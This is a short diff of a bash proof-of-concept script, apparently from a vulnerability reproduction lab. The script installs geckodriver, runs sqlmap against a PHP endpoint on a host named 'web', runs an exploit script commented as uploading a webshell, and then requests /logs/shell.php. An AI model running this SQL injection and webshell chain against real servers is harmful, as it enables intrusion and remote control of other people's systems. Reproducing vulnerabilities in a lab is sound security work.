@@ -1,5 +1,5 @@
 #!/bin/bash
-sleep 100
+sleep 10
 tar -xvzf /opt/poc/geckodriver-v0.26.0-linux64.tar.gz 
 chmod +x geckodriver 
 cp geckodriver /usr/local/bin/ 
@@ -27,6 +27,6 @@ python3 sqlmap.py -u http://web/lib/ajax/dragdroptreenodes.php --data="doAction=
 
 #upload webshell
 python3 /opt/poc/exploit.py http://web
-
+cat temp
 curl http://web/logs/shell.php
 echo "poc ok"
